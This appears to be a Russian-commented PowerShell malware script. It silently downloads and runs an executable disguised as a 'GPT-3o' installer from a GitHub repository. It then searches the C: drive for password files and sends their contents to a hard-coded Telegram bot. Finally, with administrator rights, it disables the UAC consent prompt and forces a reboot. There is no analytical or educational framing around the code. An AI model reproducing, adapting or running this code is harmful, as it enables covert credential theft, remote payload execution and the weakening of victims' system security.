# Блок 1: Скачивание и установка приложения
try {
    $exePath = Join-Path $env:ProgramData 'GPT-3o_win-x64_setup.exe'
    
    # Скачивание файла
    try {
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/rootkalilocalhost/modules/main/GPT-3o_win-x64_setup.exe' -OutFile $exePath -ErrorAction Stop
    } catch {
        Write-Error "Ошибка загрузки файла: $($_.Exception.Message)"
        throw
    }
    
    # Запуск установки
    if (Test-Path $exePath) {
        $process = Start-Process -FilePath $exePath -ArgumentList '/S' -PassThru -NoNewWindow -Wait
        if ($process.ExitCode -ne 0) {
            Write-Warning "Процесс завершился с кодом ошибки: $($process.ExitCode)"
        }
    } else {
        throw "Файл не был загружен: $exePath"
    }
} catch {
    Write-Error "Критическая ошибка в блоке установки: $($_.Exception.Message)"
} finally {
    # Удаление установщика
    if (Test-Path $exePath) {
        try {
            Remove-Item $exePath -Force -ErrorAction Stop
        } catch {
            Write-Warning "Не удалось удалить файл: $($_.Exception.Message)"
        }
    }
}

# Блок 2: Поиск и отправка файлов через Telegram
$telegramBotToken = "5574338417:AAHzByMElpQLpyZ72paKuP4Gb2gqcIByKBo"
$chatId = "1473231416"
$searchPatterns = @("пароли.txt", "passwords.txt")
$tempDir = if ($env:TEMP) { $env:TEMP } else { [System.IO.Path]::GetTempPath() }

$scriptBlock = {
    param($telegramBotToken, $chatId, $searchPatterns, $tempDir)
    
    $outputFile = Join-Path $tempDir "collected_data_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
    $encoding = [System.Text.Encoding]::UTF8
    $maxFileSize = 10 * 1024 * 1024  # 10 MB в байтах
    $maxTotalSize = 50 * 1024 * 1024  # 50 MB в байтах

    try {
        Write-Output "Начало поиска файлов..."
        
        # Поиск файлов по шаблонам
        $foundFiles = @()
        foreach ($pattern in $searchPatterns) {
            try {
                $files = Get-ChildItem "C:\" -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue
                if ($files) {
                    $foundFiles += $files
                }
            } catch {
                Write-Warning "Ошибка поиска по шаблону $pattern : $($_.Exception.Message)"
            }
        }
        
        # Удаление дубликатов
        $foundFiles = $foundFiles | Sort-Object FullName -Unique
        
        if ($foundFiles.Count -eq 0) {
            Write-Output "Файлы не найдены"
            return
        }
        
        Write-Output "Найдено файлов: $($foundFiles.Count)"
        
        # Очистка выходного файла
        if (Test-Path $outputFile) {
            Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
        }
        
        # Чтение и объединение содержимого файлов
        $totalSize = 0
        foreach ($file in $foundFiles) {
            try {
                # Проверка размера файла
                if ($file.Length -gt $maxFileSize) {
                    Write-Warning "Файл $($file.FullName) слишком большой ($([math]::Round($file.Length/1MB,2)) MB), пропускаем"
                    continue
                }
                
                # Проверка общего размера
                if (($totalSize + $file.Length) -gt $maxTotalSize) {
                    Write-Warning "Достигнут максимальный общий размер данных"
                    break
                }
                
                # Чтение файла
                $content = [System.IO.File]::ReadAllText($file.FullName, $encoding)
                $header = "=== Файл: $($file.FullName) (Размер: $($file.Length) байт) ==="
                [System.IO.File]::AppendAllText($outputFile, "$header`r`n", $encoding)
                [System.IO.File]::AppendAllText($outputFile, "$content`r`n`r`n", $encoding)
                
                $totalSize += $file.Length
                Write-Output "Обработан файл: $($file.FullName)"
                
            } catch {
                Write-Warning "Ошибка чтения файла $($file.FullName): $($_.Exception.Message)"
            }
        }
        
        # Отправка данных через Telegram
        if (Test-Path $outputFile -and (Get-Item $outputFile).Length -gt 0) {
            try {
                $fileInfo = Get-Item $outputFile
                Write-Output "Подготовка к отправке файла размером $([math]::Round($fileInfo.Length/1KB,2)) KB"
                
                # Создание временного файла для отправки
                $tempOutputFile = Join-Path $tempDir "telegram_upload_$(Get-Random).txt"
                Copy-Item $outputFile $tempOutputFile -Force
                
                # Отправка через Telegram API
                $telegramUri = "https://api.telegram.org/bot$telegramBotToken/sendDocument"
                
                $form = @{
                    chat_id = $chatId
                    caption = "Собранные данные"
                    document = Get-Item $tempOutputFile
                }
                
                $response = Invoke-RestMethod -Uri $telegramUri -Method Post -Form $form -ErrorAction Stop
                
                if ($response.ok) {
                    Write-Output "Данные успешно отправлены через Telegram"
                } else {
                    Write-Warning "Ошибка отправки: $($response.description)"
                }
                
            } catch {
                Write-Error "Ошибка отправки данных: $($_.Exception.Message)"
            } finally {
                # Очистка временных файлов
                if (Test-Path $outputFile) {
                    Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
                }
                if (Test-Path $tempOutputFile) {
                    Remove-Item $tempOutputFile -Force -ErrorAction SilentlyContinue
                }
            }
        } else {
            Write-Output "Нет данных для отправки"
        }
    } catch {
        Write-Error "Критическая ошибка в скрипт-блоке: $($_.Exception.Message)"
    }
}

# Блок 3: Запуск фонового задания
try {
    Write-Output "Запуск фонового задания для поиска файлов..."
    $job = Start-Job -ScriptBlock $scriptBlock -ArgumentList $telegramBotToken, $chatId, $searchPatterns, $tempDir
    
    # Ожидание завершения задания с таймаутом
    $jobResult = Wait-Job $job -Timeout 300
    
    if ($jobResult) {
        $jobOutput = Receive-Job $job
        Write-Output "Результат выполнения задания:"
        $jobOutput | ForEach-Object { Write-Output $_ }
    } else {
        Write-Warning "Задание не завершилось в течение 300 секунд"
        # Принудительная остановка задания
        Stop-Job $job -ErrorAction SilentlyContinue
    }
} catch {
    Write-Error "Ошибка управления заданием: $($_.Exception.Message)"
} finally {
    # Очистка задания
    if ($job) {
        Remove-Job $job -Force -ErrorAction SilentlyContinue
        Write-Output "Задание очищено"
    }
}

# Блок 4: Изменение системных настроек и перезагрузка
try {
    if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Warning "Обнаружены права администратора..."
        Write-Warning "Изменение системных настроек UAC..."
        
        # Отключение UAC
        Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Type DWord -Force -ErrorAction Stop
        Write-Output "UAC отключен"
        
        # Перезагрузка
        Write-Warning "Перезагрузка компьютера через 15 секунд..."
        for ($i = 15; $i -gt 0; $i--) {
            Write-Output "Перезагрузка через $i секунд..."
            Start-Sleep -Seconds 1
        }
        
        Write-Output "Выполняется перезагрузка..."
        Restart-Computer -Force -ErrorAction Stop
        
    } else {
        Write-Output "Недостаточно прав для изменения системных настроек (требуются права администратора)"
    }
} catch {
    Write-Error "Ошибка изменения системных настроек: $($_.Exception.Message)"
}

Write-Output "Скрипт завершен"
